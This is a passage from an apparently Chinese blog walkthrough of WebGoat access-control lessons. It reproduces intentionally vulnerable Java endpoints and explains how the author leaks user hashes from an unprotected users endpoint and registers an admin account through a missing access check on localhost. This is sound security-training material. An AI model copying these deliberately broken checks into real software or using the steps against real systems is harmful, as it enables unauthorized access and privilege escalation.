.output(currentUserProfile.profileToMap().toString())</span><br><span class="line">                    .build();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userSubmittedProfile.getUserId().equals(authUserId)) &#123;</span><br><span class="line"><span class="comment">//            或者当前用户id不等于 得到的id</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;idor.edit.profile.failure4&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (currentUserProfile.getColor().equals(<span class="string">&quot;black&quot;</span>) &amp;&amp; currentUserProfile.getRole() &lt;= <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">//            如果当前用户颜色是black 并且 role &lt;= 1</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;idor.edit.profile.success2&quot;</span>)</span><br><span class="line">                    .output(userSessionData.getValue(<span class="string">&quot;idor-updated-own-profile&quot;</span>).toString())</span><br><span class="line">                    .build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;idor.edit.profile.failure3&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前提也是需要先进行登录</p>
<p>这里既然提交的是一个json格式的UserProfile 那么我们需要 UserProfile 的json格式是什么样子的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831224719251.png" alt="image-20220831224719251"></p>
<p>这里还需要put请求</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831224726850.png" alt="image-20220831224726850"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831225511648.png" alt="image-20220831225511648"></p>
<p>总共有三个地方一是 id 二是 role 三是 color</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831230855877.png" alt="image-20220831230855877"></p>
<p>但是这里还有一个black也可以过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831231142555.png" alt="image-20220831231142555"></p>
<p>但是这里上面如果是null 的话下面就会爆空指针异常 不知道怎么过</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/187718176-8102d348-9a44-4e32-9fb1-9e03cacc31e7.png" alt="187718176"></p>
<h2 id="missing-ac"><a href="#missing-ac" class="headerlink" title="missing_ac"></a>missing_ac</h2><h3 id="MissingFunctionACHiddenMenus"><a href="#MissingFunctionACHiddenMenus" class="headerlink" title="MissingFunctionACHiddenMenus"></a>MissingFunctionACHiddenMenus</h3><p>这里注意对源码进行了修改,后面会提到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.missing_ac;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;access-control.hidden-menus.hint1&quot;,&quot;access-control.hidden-menus.hint2&quot;,&quot;access-control.hidden-menus.hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MissingFunctionACHiddenMenus</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/access-control/hidden-menu&quot;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(String hiddenMenu1,String hiddenMenu2)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hiddenMenu1.toLowerCase().equals(<span class="string">&quot;users&quot;</span>) &amp;&amp; hiddenMenu2.toLowerCase().equals(<span class="string">&quot;config&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//            这里是对比两个 值是否相等 比较简单 但是比较考验前段的知识</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                    .output(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;access-control.hidden-menus.success&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (hiddenMenu1.equals(<span class="string">&quot;Config&quot;</span>) &amp;&amp; hiddenMenu2.equals(<span class="string">&quot;Users&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                    .output(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;access-control.hidden-menus.failure&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                .feedback(<span class="string">&quot;access-control.hidden-menus.failure&quot;</span>)</span><br><span class="line">                .output(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单翻译一下这一关就可以发现 其实是让我们去源码中寻找一下 隐藏的 路径信息 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131356161.png" alt="image-20220901131356161"></p>
<p>这里其实不是特别的好找,首先我们先把所有的标签给展开先 先找到body这个标签</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901130630692.png" alt="image-20220901130630692"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901130700058.png" alt="image-20220901130700058"></p>
<p>接着根据工具去定位大致的位置</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901130730816.png" alt="image-20220901130730816"></p>
<p>稍微往上一翻可以找到了 还有一个问题这里填那两个 ?</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131054794.png" alt="image-20220901131054794"></p>
<p> 但是呢这里就存在一个问题 既然前端显示的是小写 但是后端判断的是大写 那么就会导致无法过关 这里我们对源码进行一下修改</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131706235.png" alt="image-20220901131706235"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131923443.png" alt="image-20220901131923443"></p>
<h3 id="MissingFunctionACYourHash"><a href="#MissingFunctionACYourHash" class="headerlink" title="MissingFunctionACYourHash"></a>MissingFunctionACYourHash</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.missing_ac;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_ADMIN;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_SIMPLE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;access-control.hash.hint1&quot;, &quot;access-control.hash.hint2&quot;, &quot;access-control.hash.hint3&quot;, &quot;access-control.hash.hint4&quot;, &quot;access-control.hash.hint5&quot;&#125;)</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MissingFunctionACYourHash</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MissingAccessControlUserRepository userRepository;</span><br><span class="line"><span class="comment">//      这里创建一个与数据库交互的类</span></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/access-control/user-hash&quot;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">simple</span><span class="params">(String userHash)</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userRepository.findByUsername(<span class="string">&quot;Jerry&quot;</span>);</span><br><span class="line"><span class="comment">//        通过username 获取 user用户</span></span><br><span class="line">        <span class="type">DisplayUser</span> <span class="variable">displayUser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DisplayUser</span>(user,PASSWORD_SALT_SIMPLE);</span><br><span class="line"><span class="comment">//        获取一个用户</span></span><br><span class="line">        <span class="keyword">if</span> (userHash.equals(displayUser.getUserHash()))&#123;</span><br><span class="line"><span class="comment">//            如果hash相等</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;access-control.hash.success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="MissingAccessControlUserRepository"><a href="#MissingAccessControlUserRepository" class="headerlink" title="MissingAccessControlUserRepository"></a>MissingAccessControlUserRepository</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.missing_ac;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.RowMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.namedparam.MapSqlParameterSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.CollectionUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MissingAccessControlUserRepository</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> NamedParameterJdbcTemplate jdbcTemplate;</span><br><span class="line"><span class="comment">//    这里是使用的 框架的 jdbc工具栏 去方便的进行sql查询</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RowMapper&lt;User&gt; mapper = (rs,rowMapper) -&gt; <span class="keyword">new</span> <span class="title class_">User</span>(rs.getString(<span class="string">&quot;username&quot;</span>),rs.getString(<span class="string">&quot;password&quot;</span>),rs.getBoolean(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line"><span class="comment">//    这里不理解的 的看下面的图</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MissingAccessControlUserRepository</span><span class="params">(LessonDataSource lessonDataSource)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.jdbcTemplate = <span class="keyword">new</span> <span class="title class_">NamedParameterJdbcTemplate</span>(lessonDataSource);</span><br><span class="line"><span class="comment">//        这里是进行 jdbc的初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAllUsers</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.query(<span class="string">&quot;select username,password,admin from access_control_users&quot;</span>,mapper);</span><br><span class="line"><span class="comment">//      这里是进行了数据库的查询</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">findByUsername</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">users</span> <span class="operator">=</span> jdbcTemplate.query(<span class="string">&quot;select username,password,admin from access_control_users where username=:username&quot;</span>,<span class="keyword">new</span> <span class="title class_">MapSqlParameterSource</span>().addValue(<span class="string">&quot;username&quot;</span>,username),mapper);</span><br><span class="line"><span class="comment">//        这里我想的是存不存在sql注入 从这里的含义上来看是存在的 先放一下</span></span><br><span class="line">        <span class="keyword">if</span> (CollectionUtils.isEmpty(users))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> users.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">save</span><span class="params">(User user)</span>&#123;</span><br><span class="line">        jdbcTemplate.update(<span class="string">&quot;INSERT INTO access_control_users(username, password, admin) VALUES(:username,:password,:admin)&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MapSqlParameterSource</span>()</span><br><span class="line">                        .addValue(<span class="string">&quot;username&quot;</span>,user.getUsername())</span><br><span class="line">                        .addValue(<span class="string">&quot;password&quot;</span>,user.getPassword())</span><br><span class="line">                        .addValue(<span class="string">&quot;admin&quot;</span>,user.isAdmin()));</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里看一眼 RowMapper的解释 首先这个接口是对 数据库中列的映射 其中需要实现下面的mapRow方法 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901142416684.png" alt="image-20220901142416684"></p>
<p>注意看这里其实是用 lamda表达式其中这里 new了一个接口并传入了User这个对象  这里传入的两个参数 其中第一个参数就是查询到的当前列的值 第二个参数代表着 当前是第几列</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901142549715.png" alt="image-20220901142549715"></p>
<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.missing_ac;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"><span class="comment">//    这里很明显是一个数据类</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> admin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901200340102.png" alt="image-20220901200339904"></p>
<p>到这里其实还是没有办法去完成的 因为我们不知道用户的信息 还需要接着写</p>
<h3 id="MissingFunctionACUsers"><a href="#MissingFunctionACUsers" class="headerlink" title="MissingFunctionACUsers"></a>MissingFunctionACUsers</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.missing_ac;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_ADMIN;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_SIMPLE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MissingFunctionACUsers</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MissingAccessControlUserRepository userRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &#123;&quot;access-control/users&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">listUsers</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line"><span class="comment">//        创建一个 model 对象</span></span><br><span class="line">        model.setViewName(<span class="string">&quot;list_users&quot;</span>);</span><br><span class="line"><span class="comment">//        设置一个list_users值</span></span><br><span class="line">        List&lt;User&gt; allUsers = userRepository.findAllUsers();</span><br><span class="line"><span class="comment">//        查找所用用户</span></span><br><span class="line">        model.addObject(<span class="string">&quot;numUsers&quot;</span>, allUsers.size());</span><br><span class="line"><span class="comment">//        将用户的数量添加进去</span></span><br><span class="line">        List&lt;DisplayUser&gt; displayUsers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//        新建一个displayUser数组</span></span><br><span class="line">        <span class="keyword">for</span> (User user : allUsers) &#123;</span><br><span class="line">            displayUsers.add(<span class="keyword">new</span> <span class="title class_">DisplayUser</span>(user, PASSWORD_SALT_SIMPLE));</span><br><span class="line"><span class="comment">//            将查到的用户填入到内存中</span></span><br><span class="line">        &#125;</span><br><span class="line">        model.addObject(<span class="string">&quot;allUsers&quot;</span>, displayUsers);</span><br><span class="line"><span class="comment">//        在model中添加进去</span></span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &#123;&quot;access-control/users&quot;&#125;, consumes = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">//    接受请求参数 json</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;List&lt;DisplayUser&gt;&gt; <span class="title function_">usersService</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//      获取用户信息</span></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(userRepository.findAllUsers().stream().map(user -&gt; <span class="keyword">new</span> <span class="title class_">DisplayUser</span>(user, PASSWORD_SALT_SIMPLE)).collect(Collectors.toList()));</span><br><span class="line"><span class="comment">//        返回所有用户的信息</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &#123;&quot;access-control/users-admin-fix&quot;&#125;, consumes = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">//    接受json参数</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;List&lt;DisplayUser&gt;&gt; <span class="title function_">usersFixed</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">currentUser</span> <span class="operator">=</span> userRepository.findByUsername(webSession.getUserName());</span><br><span class="line"><span class="comment">//        获取当前 session中的用户名的信息</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser != <span class="literal">null</span> &amp;&amp; currentUser.isAdmin()) &#123;</span><br><span class="line"><span class="comment">//            如果当前用户不为空 并且当前用户是admin</span></span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok(userRepository.findAllUsers().stream().map(user -&gt; <span class="keyword">new</span> <span class="title class_">DisplayUser</span>(user, PASSWORD_SALT_ADMIN)).collect(Collectors.toList()));</span><br><span class="line"><span class="comment">//            返回所有用户的信息</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.FORBIDDEN).build();</span><br><span class="line"><span class="comment">//        返回禁止访问</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &#123;&quot;access-control/users&quot;, &quot;access-control/users-admin-fix&quot;&#125;, consumes = &quot;application/json&quot;, produces = &quot;application/json&quot;)</span></span><br><span class="line"><span class="comment">//    接受json信息 产生json信息</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">addUser</span><span class="params">(<span class="meta">@RequestBody</span> User newUser)</span> &#123;</span><br><span class="line"><span class="comment">//        接受newUser</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            userRepository.save(newUser);</span><br><span class="line"><span class="comment">//            保存增用户</span></span><br><span class="line">            <span class="keyword">return</span> newUser;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;Error creating new User&quot;</span>, ex);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里首先需要的是获取用户的hash值</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901224615901.png" alt="image-20220901224615901"></p>
<p>可以注意到的是这里的路径是存在问题的,那就是这里的前缀</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901224654510.png" alt="image-20220901224654510"></p>
<p>直接访问必报404</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/WebGoat/access-control/users</span><br></pre></td></tr></table></figure>

<p>需要添加WebGoat</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901224856920.png" alt="image-20220901224856920"></p>
<p>这里爆了一个异常 原因也很简单的 主要是由于这个接口作为一个遗漏接口 由于没有进行完善所以导致 这个list_users.html不存在</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901225836073.png" alt="image-20220901225836073"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>这里添加上这个json请求头就可以处理这个请求了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901225940006.png" alt="image-20220901225940006"></p>
<p>原因是这里是可以接受 json格式的数据去 解析并将json格式的数据进行返回的</p>
<p>那么我们之间提交Jerry的hash即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902090152804.png" alt="image-20220902090152804"></p>
<h3 id="MissingFunctionACYourHashAdmin"><a href="#MissingFunctionACYourHashAdmin" class="headerlink" title="MissingFunctionACYourHashAdmin"></a>MissingFunctionACYourHashAdmin</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.missing_ac;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_ADMIN;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;access-control.hash.hint6&quot;, &quot;access-control.hash.hint7&quot;,</span></span><br><span class="line"><span class="meta">        &quot;access-control.hash.hint8&quot;, &quot;access-control.hash.hint9&quot;, &quot;access-control.hash.hint10&quot;, &quot;access-control.hash.hint11&quot;, &quot;access-control.hash.hint12&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MissingFunctionACYourHashAdmin</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MissingAccessControlUserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MissingFunctionACYourHashAdmin</span><span class="params">(MissingAccessControlUserRepository userRepository)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.userRepository = userRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/access-control/user-hash-fix&quot;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">admin</span><span class="params">(String userHash)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">user</span> <span class="operator">=</span>userRepository.findByUsername(<span class="string">&quot;Jerry&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">displayUser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DisplayUser</span>(user,PASSWORD_SALT_ADMIN);</span><br><span class="line"><span class="comment">//        这里需要与admin相同</span></span><br><span class="line">        <span class="keyword">if</span> (userHash.equals(displayUser.getUserHash())) &#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;access-control.hash.success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;access-control.hash.close&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也就是我们需要把Jerry更改为admin才可登录 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902091321449.png" alt="image-20220902091321449"></p>
<p>也就是这里的两个方法 一个获取用户并保存到数据库中去 另一个方法查看用户hash</p>
<p>但是这里需要注意的是 这里的newUser 也就是一个User对象</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902091703044.png" alt="image-20220902091703044"></p>
<p>注意观察参数</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094423466.png" alt="image-20220902094423466"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094410855.png" alt="image-20220902094410855"></p>
<p>这里我们总共添加了两个用户 一个是当前登录webgoat的用户 也就是123456</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094628695.png" alt="image-20220902094628695"></p>
<p>这里就把admin的hash也查出来了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094709032.png" alt="image-20220902094709032"></p>
